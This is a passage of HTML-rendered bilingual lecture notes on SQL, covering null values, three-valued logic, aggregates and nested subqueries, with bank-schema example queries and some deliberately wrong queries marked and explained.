</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#note-db-sql-__codelineno-47-3"></a><span class="w">        </span><span class="p">[</span><span class="k">WHERE</span><span class="w"> </span><span class="o">&lt;</span><span class="n">condition</span><span class="o">&gt;</span><span class="p">]</span><span class="w"> </span>
</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#note-db-sql-__codelineno-47-4"></a><span class="w">        </span><span class="p">[</span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="o">&lt;</span><span class="n">c1</span><span class="p">,</span><span class="w"> </span><span class="n">c2</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="o">&gt;</span><span class="w"> </span><span class="p">[</span><span class="k">HAVING</span><span class="w"> </span><span class="o">&lt;</span><span class="n">condition</span><span class="o">&gt;</span><span class="p">]]</span><span class="w"> </span>
</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#note-db-sql-__codelineno-47-5"></a><span class="w">        </span><span class="p">[</span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="o">&lt;</span><span class="n">c1</span><span class="w"> </span><span class="p">[</span><span class="k">DESC</span><span class="p">]</span><span class="w"> </span><span class="p">[,</span><span class="w"> </span><span class="n">c2</span><span class="w"> </span><span class="p">[</span><span class="k">DESC</span><span class="o">|</span><span class="k">ASC</span><span class="p">],</span><span class="w"> </span><span class="err">…</span><span class="p">]</span><span class="o">&gt;</span><span class="p">]</span><span class="w"> </span>
</span></code></pre></div>
<p>[] 表示可选部分</p>
<p>其执行顺序为</p>
<pre class="mermaid"><code>flowchart LR
    A[From] --&gt; B[Where]
    B --&gt; C[Group By / aggregate]
    C --&gt; D[Having]
    D --&gt; E[Select]
    E --&gt; F[Distinct]
    F --&gt; G[Order By]</code></pre>
<div style="text-align: center;font-size: 1em;color: blue;">Note that predicates in the having clause are applied after the formation of groups, whereas predicates in the where clause are applied before forming groups.</div>

<h2 id="note-db-sql-null-values">Null Values<a class="headerlink" href="#note-db-sql-null-values" title="Permanent link">&para;</a></h2>
<p>Null is a special marker used in SQL and was first introduced by E.F. Codd in 1974.</p>
<p>The meaning of null is that the value is unknown or not applicable.</p>
<p>The result of any arithmetic operation involving null is null.</p>
<blockquote>
<p>5+null = null</p>
</blockquote>
<p>Any comparison involving null is 'unknown', which is neither true nor false.</p>
<blockquote>
<p>null = null is unknown</p>
</blockquote>
<div class="admonition info">
<p class="admonition-title">unknown</p>
<p>Three-valued logic using the truth value unknown: (true, false, unknown)</p>
<ul>
<li>
<p><code>OR</code> operation: </p>
<ul>
<li>(unknown OR true) = true</li>
<li>(unknown OR false) = unknown </li>
<li>(unknown OR unknown) = unknown</li>
</ul>
</li>
<li>
<p><code>AND</code> operation:</p>
<ul>
<li>(unknown AND true) = unknown</li>
<li>(unknown AND false) = false</li>
<li>(unknown AND unknown) = unknown</li>
</ul>
</li>
<li>
<p><code>NOT</code> operation:</p>
<ul>
<li>(NOT unknown) = unknown</li>
</ul>
</li>
<li>
<p><code>=</code> operation:</p>
<ul>
<li>(unknown = unknown) = unknown</li>
</ul>
</li>
<li>
<p><code>!=</code> operation:</p>
<ul>
<li>(unknown != unknown) = unknown</li>
</ul>
</li>
</ul>
</div>
<p>The predicate <code>IS NULL</code>  and <code>IS NOT NULL</code> are used to test for null values.</p>
<blockquote>
<p>recall that the primary key of a relation cannot be null.</p>
</blockquote>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Find all loan number which appears in the loan relation with null values for amount. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#note-db-sql-__codelineno-48-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">loan_number</span>
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#note-db-sql-__codelineno-48-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">loan</span>
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#note-db-sql-__codelineno-48-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">amount</span><span class="w"> </span><span class="k">IS</span><span class="w"> </span><span class="k">NULL</span><span class="p">;</span>
</span></code></pre></div>
<p>we cannot use <code>=</code> to test for null values,the result will return null.</p>
<p>see as follows:</p>
<p><figure markdown="span">
<img alt="null" src="../NOTE/DB/img/sql-1.png" width="300" />
</figure></p>
</div>
<h3 id="note-db-sql-null-values-in-aggregate-functions">Null Values in Aggregate Functions<a class="headerlink" href="#note-db-sql-null-values-in-aggregate-functions" title="Permanent link">&para;</a></h3>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#note-db-sql-__codelineno-49-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">sum</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="p">;</span>
</span></code></pre></div>
<p>This will return the sum of the balance of all the accounts.Result is null if there is no non-null values.</p>
<p>All aggregate operations <strong>except count(*)</strong> ignore tuples with null values on the aggregated attributes. </p>
<h2 id="note-db-sql-nested-subqueries">Nested Subqueries<a class="headerlink" href="#note-db-sql-nested-subqueries" title="Permanent link">&para;</a></h2>
<p>Nested subqueries in SQL are queries within queries. They allow you to perform more complex queries by embedding one query inside another. This is particularly useful when you need to filter data based on the results of another query.</p>
<h3 id="note-db-sql-basic-structure_1">Basic Structure<a class="headerlink" href="#note-db-sql-basic-structure_1" title="Permanent link">&para;</a></h3>
<p>A nested subquery is typically found in the <code>WHERE</code> clause of a SQL statement. The subquery is executed first, and its result is used by the outer query.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#note-db-sql-__codelineno-50-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">column1</span><span class="p">,</span><span class="w"> </span><span class="n">column2</span>
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#note-db-sql-__codelineno-50-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span>
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#note-db-sql-__codelineno-50-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">column3</span><span class="w"> </span><span class="o">&lt;</span><span class="k">operator</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#note-db-sql-__codelineno-50-4"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">column3</span>
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#note-db-sql-__codelineno-50-5"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">table2</span>
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#note-db-sql-__codelineno-50-6"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">condition</span>
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#note-db-sql-__codelineno-50-7"></a><span class="p">);</span>
</span></code></pre></div>
<p>the <code>&lt;operator&gt;</code> can be <code>=</code>, <code>!=</code>, <code>&gt;</code>, <code>&gt;=</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>IN</code>, <code>NOT IN</code>, <code>ANY</code>, <code>ALL</code>, <code>EXISTS</code>, <code>NOT EXISTS</code>. </p>
<p>it can also be nested in the FROM clause.</p>
<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#note-db-sql-__codelineno-51-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">column1</span><span class="p">,</span><span class="w"> </span><span class="n">column2</span>
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#note-db-sql-__codelineno-51-2"></a><span class="k">FROM</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">column3</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table2</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">condition</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">subquery</span><span class="p">;</span>
</span></code></pre></div>
or in the having clause such as:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#note-db-sql-__codelineno-52-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">department</span><span class="p">,</span><span class="w"> </span><span class="k">AVG</span><span class="p">(</span><span class="n">salary</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">avg_salary</span>
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#note-db-sql-__codelineno-52-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span>
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#note-db-sql-__codelineno-52-3"></a><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">department</span>
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#note-db-sql-__codelineno-52-4"></a><span class="k">HAVING</span><span class="w"> </span><span class="k">AVG</span><span class="p">(</span><span class="n">salary</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">AVG</span><span class="p">(</span><span class="n">salary</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="p">);</span>
</span></code></pre></div>
<blockquote>
<p>找出每个 [部门平均工资] 大于[所有员工平均工资]的部门。</p>
</blockquote>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Find all customers who have both an account and a loan at the bank. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#note-db-sql-__codelineno-53-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span>
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#note-db-sql-__codelineno-53-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span>
</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#note-db-sql-__codelineno-53-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">customer_id</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#note-db-sql-__codelineno-53-4"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_id</span>
</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#note-db-sql-__codelineno-53-5"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span>
</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#note-db-sql-__codelineno-53-6"></a><span class="p">);</span>
</span></code></pre></div>
<p>recall that we can also use the set operation to achieve the same result.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#note-db-sql-__codelineno-54-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span>
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#note-db-sql-__codelineno-54-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span>
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#note-db-sql-__codelineno-54-3"></a><span class="k">INTERSECT</span>
</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#note-db-sql-__codelineno-54-4"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="p">;</span>
</span></code></pre></div>
<p>Find  all customers who have both an account and a loan at the Perryridge branch. </p>
<ul>
<li>
<p>query 1:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#note-db-sql-__codelineno-55-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">DISTINCT</span><span class="w"> </span><span class="n">customer_name</span>
</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#note-db-sql-__codelineno-55-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span><span class="w"> </span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span><span class="n">L</span>
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#note-db-sql-__codelineno-55-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">B</span><span class="p">.</span><span class="n">loan_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">L</span><span class="p">.</span><span class="n">loan_number</span>
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#note-db-sql-__codelineno-55-4"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span>
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#note-db-sql-__codelineno-55-5"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">customer_name</span><span class="p">)</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#note-db-sql-__codelineno-55-6"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">customer_name</span>
</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#note-db-sql-__codelineno-55-7"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="n">D</span><span class="p">,</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="n">A</span>
</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#note-db-sql-__codelineno-55-8"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">D</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">A</span><span class="p">.</span><span class="n">account_number</span>
</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#note-db-sql-__codelineno-55-9"></a><span class="w">  </span><span class="p">);</span>
</span></code></pre></div></p>
</li>
<li>
<p>query 2:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#note-db-sql-__codelineno-56-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">DISTINCT</span><span class="w"> </span><span class="n">customer_name</span>
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#note-db-sql-__codelineno-56-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span><span class="w"> </span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span><span class="n">L</span>
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#note-db-sql-__codelineno-56-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">B</span><span class="p">.</span><span class="n">loan_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">L</span><span class="p">.</span><span class="n">loan_number</span>
</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#note-db-sql-__codelineno-56-4"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span>
</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#note-db-sql-__codelineno-56-5"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">customer_name</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#note-db-sql-__codelineno-56-6"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span>
</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#note-db-sql-__codelineno-56-7"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="n">D</span><span class="p">,</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="n">A</span>
</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#note-db-sql-__codelineno-56-8"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">D</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">A</span><span class="p">.</span><span class="n">account_number</span>
</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#note-db-sql-__codelineno-56-9"></a><span class="w">      </span><span class="k">AND</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span>
</span><span id="__span-56-10"><a id="__codelineno-56-10" name="__codelineno-56-10" href="#note-db-sql-__codelineno-56-10"></a><span class="p">);</span>
</span></code></pre></div></p>
</li>
<li>
<p>query 3:指定名称，将外层的结果传递进去
<div class="language-sql highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#note-db-sql-__codelineno-57-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">DISTINCT</span><span class="w"> </span><span class="n">customer_name</span>
</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#note-db-sql-__codelineno-57-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span><span class="w"> </span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">t</span>
</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#note-db-sql-__codelineno-57-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">B</span><span class="p">.</span><span class="n">loan_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">t</span><span class="p">.</span><span class="n">loan_number</span>
</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#note-db-sql-__codelineno-57-4"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span>
</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#note-db-sql-__codelineno-57-5"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">customer_name</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#note-db-sql-__codelineno-57-6"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span>
</span><span id="__span-57-7"><a id="__codelineno-57-7" name="__codelineno-57-7" href="#note-db-sql-__codelineno-57-7"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="n">D</span><span class="p">,</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="n">A</span>
</span><span id="__span-57-8"><a id="__codelineno-57-8" name="__codelineno-57-8" href="#note-db-sql-__codelineno-57-8"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">D</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">A</span><span class="p">.</span><span class="n">account_number</span>
</span><span id="__span-57-9"><a id="__codelineno-57-9" name="__codelineno-57-9" href="#note-db-sql-__codelineno-57-9"></a><span class="w">      </span><span class="k">AND</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">t</span><span class="p">.</span><span class="n">branch_name</span><span class="w"> </span><span class="c1">-- branch_name is the same as the branch_name in the outer (Perryridge)</span>
</span><span id="__span-57-10"><a id="__codelineno-57-10" name="__codelineno-57-10" href="#note-db-sql-__codelineno-57-10"></a><span class="p">);</span>
</span></code></pre></div></p>
</li>
</ul>
</div>
<p>Find the account_number with the maximum balance for every branch.</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#note-db-sql-__codelineno-58-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">account_number</span><span class="p">,</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span>
</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#note-db-sql-__codelineno-58-2"></a><span class="w">          </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#note-db-sql-__codelineno-58-3"></a><span class="w">        </span><span class="k">WHERE</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="k">max</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#note-db-sql-__codelineno-58-4"></a><span class="w">        </span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span>
</span></code></pre></div>
<p>错，聚合函数不能在where子句中使用</p>
<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#note-db-sql-__codelineno-59-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">account_number</span><span class="p">,</span><span class="w"> </span><span class="k">max</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#note-db-sql-__codelineno-59-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#note-db-sql-__codelineno-59-3"></a><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span>
</span></code></pre></div>
错误，account_number不是聚合函数的一部分，且没有在group by子句中</p>
<p>正确的为</p>
<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#note-db-sql-__codelineno-60-1"></a><span class="c1">-- Select account number and balance from the account table</span>
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#note-db-sql-__codelineno-60-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">account_number</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">AN</span><span class="p">,</span><span class="w"> </span><span class="n">balance</span>
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#note-db-sql-__codelineno-60-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="n">A</span>
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#note-db-sql-__codelineno-60-4"></a><span class="c1">-- Filter to get accounts with the maximum balance in each branch</span>
</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#note-db-sql-__codelineno-60-5"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#note-db-sql-__codelineno-60-6"></a><span class="w">    </span><span class="c1">-- Subquery to get the maximum balance for each branch</span>
</span><span id="__span-60-7"><a id="__codelineno-60-7" name="__codelineno-60-7" href="#note-db-sql-__codelineno-60-7"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="k">max</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span>
</span><span id="__span-60-8"><a id="__codelineno-60-8" name="__codelineno-60-8" href="#note-db-sql-__codelineno-60-8"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="n">B</span>
</span><span id="__span-60-9"><a id="__codelineno-60-9" name="__codelineno-60-9" href="#note-db-sql-__codelineno-60-9"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">A</span><span class="p">.</span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">B</span><span class="p">.</span><span class="n">branch_name</span>
</span><span id="__span-60-10"><a id="__codelineno-60-10" name="__codelineno-60-10" href="#note-db-sql-__codelineno-60-10"></a><span class="p">)</span>
</span><span id="__span-60-11"><a id="__codelineno-60-11" name="__codelineno-60-11" href="#note-db-sql-__codelineno-60-11"></a><span class="c1">-- Order the results by balance</span>
</span><span id="__span-60-12"><a id="__codelineno-60-12" name="__codelineno-60-12" href="#note-db-sql-__codelineno-60-12"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">balance</span><span class="p">;</span>
</span></code></pre></div>
但是
<div class="language-sql highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#note-db-sql-__codelineno-61-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">account_number</span><span class="p">,</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span>
</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#note-db-sql-__codelineno-61-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#note-db-sql-__codelineno-61-3"></a><span class="k">GROUP</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span>
</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#note-db-sql-__codelineno-61-4"></a><span class="k">HAVING</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="k">max</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#note-db-sql-__codelineno-61-5"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span>
</span></code></pre></div>
错误，max(balance)是聚合列，balance不是聚合列</p>
<h3 id="note-db-sql-set-comparison">Set Comparison<a class="headerlink" href="#note-db-sql-set-comparison" title="Permanent link">&para;</a></h3>
<p>Find all branches that have greater assets than some branch located in Brooklyn. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#note-db-sql-__codelineno-62-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span>
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#note-db-sql-__codelineno-62-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span>
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#note-db-sql-__codelineno-62-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">assets</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">SOME</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#note-db-sql-__codelineno-62-4"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">assets</span>
</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#note-db-sql-__codelineno-62-5"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span>
</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#note-db-sql-__codelineno-62-6"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_city</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Brooklyn&#39;</span>
</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7" href="#note-db-sql-__codelineno-62-7"></a><span class="p">);</span>
</span></code></pre></div>
<p>Find all branches that have greater assets than all branches located in Brooklyn.</p>
<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#note-db-sql-__codelineno-63-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span>
